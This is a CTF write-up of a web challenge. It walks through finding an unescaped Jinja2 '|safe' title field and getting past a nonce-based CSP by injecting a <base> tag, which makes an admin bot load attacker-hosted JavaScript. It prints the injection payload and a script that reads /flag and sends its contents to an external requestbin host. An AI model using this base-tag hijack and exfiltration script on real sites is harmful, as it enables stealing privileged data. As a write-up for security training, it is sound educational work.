# LakeCTF - People Challenge Writeup (Web)

# Part 0: Reconnaissance
We receive a link to the challenge environment and the source code + Docker files for the backend. 
The target webpage has only a few very simple functionalities: register, login, edit profile and report profile.
![Registering page](/Assets/Pasted%20image%2020220926184329.png)

Profile page
![Profile page](/Assets/Pasted%20image%2020220926184513.png)

The most interesting functionality of course is "Report profile", because when clicking it, the user is displayed a text saying "Thank you, an admin will review your report shortly.", hinting that there is a bot in the backend, that we somehow have to abuse. 

The flag in this challenge is an environment variable that's only admin accessible on the path `/flag`
```Python
@main.route('/flag')
def flag():
    if request.cookies.get('admin_token') == admin_token:
        return os.getenv('FLAG') or 'flag{flag_not_set}'
    else:
        abort(403)
```

# Part 1: Strategizing
The source code indeed reveals that there is a bot with an admin cookie that will shortly visit your profile page.
```Python
from pyppeteer import launch
import asyncio

async def visit(user_id, admin_token):
    url = f'http://web:8080/profile/{user_id}'
    print("Visiting", url)
    browser = await launch({'args': ['--no-sandbox', '--disable-setuid-sandbox']})
    page = await browser.newPage()
    await page.setCookie({'name': 'admin_token', 'value': admin_token, 'url': 'http://web:8080', 'httpOnly': True, 'sameSite': 'Strict'})
    await page.goto(url)
    await asyncio.sleep(3)
    await browser.close()
```

My first strategy idea of leaking the bot's `admin_token` cookie proved to be false, because the cookie has the `httpOnly` flag set and this prevents if from being accessed by JavaScript.  

My second strategy idea is to implant an XSS to the user's profile that makes a request to `/flag` and then sends the data over to us. The logic seems sound, so on the execution.

# Part 2: Injection search
To implant out malicious JavaScript we needed to find an input field that was unsanitized. Problem is that Flask (the web framework in this challenge) by default automatically escapes HTML from inputs when it renders templates.
For a while we were looking at the user's biography input section, since it supported Markdown input and used the Marked JS library for parsing that input. Though it is sanitized using the DOMPurify library, similar configurations have in the past been exploitable.
```JavaScript
  var markdown = document.querySelectorAll(".markdown");
  for (var i = 0; i < markdown.length; i++) {
	var html = marked.parse(markdown[i].innerHTML, {
	  breaks: true
	});
	html = DOMPurify.sanitize(html, { USE_PROFILES: { html: true } });
	markdown[i].innerHTML = html;
  }```

We were however unable to find an XSS this way. After some searching one of us went to check what the `safe` option in the template input meant.
```JavaScript
{% set description = '%s at %s' % (user['title'], user['lab']) %}
{% block title %}{{user['fullname']}} | {{description|safe}}{% endblock %}
```

It turned out that `safe` unintuitively means "trust this input, it's safe, don't escape it". This was well phrased in this [StackOverflow thread](https://stackoverflow.com/questions/48975383/why-to-use-safe-in-jinja2-python). We therefore had our injection point! Either the `title` or the `lab` value from the user's profile. 

# Part 3: Exploitation
We then quickly rushed to use this injection point for our JavaScript and indeed we were able to inject the payload `<script>alert(1)</script>` but disappointingly, the content of the script wasn't executed. Turned out that we were being blocked by the site's CSP and required a nonce value to execute our script.

![CSP](/Assets/Pasted%20image%2020220928134157.png)
Other scripts had their nonce injected.
```HTML
    <script src="/static/js/marked.min.js" nonce="{{ csp_nonce() }}"></script>
    <script src="/static/js/purify.min.js" nonce="{{ csp_nonce() }}"></script>
```

After searching for some [HTML scriptless injection](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection) searching I came across the possibility of setting our own `<base>` tag. Since both scripts were loaded using a relative path, we could serve them on our own web server and by setting the `<base>` tag to out web server have the bot query our scripts when visiting our profile.

We first used a request bin as a proof of concept and registered a new user with our payload `</title><base href="https://enz1qwuixexc.x.pipedream.net/">` and it worked!
![](/Assets/Pasted%20image%2020220928135615.png)

![](/Assets/Pasted%20image%2020220928144055.png)

As our PoC worked, we then just made a short script that fetches the content of `/flag`, uploaded it to our web server as `marked.min.js` and reported our profile.
```JavaScript
function reqListener () {
  fetch("https://enj1mevg4ope.x.pipedream.net/?"+this.responseText);
}
const req = new XMLHttpRequest();
req.addEventListener("load", reqListener);
req.open("GET", "http://web:8080/flag");
req.send();
```
This nicely returned us the flag `EPFL{Th1s_C5P_byp4ss_1s_b4sed}`.

# Part 4: Take-aways
There are some security related take-aways from this challenge:
1. CTF solving wise - don't assume that when an option specifies `safe` it is actually "safe". Recheck what each parameter/flag means if you don't know.
2. As a developer - there are ways around CSP-s so it is important to use full references for scripts instead of relative references.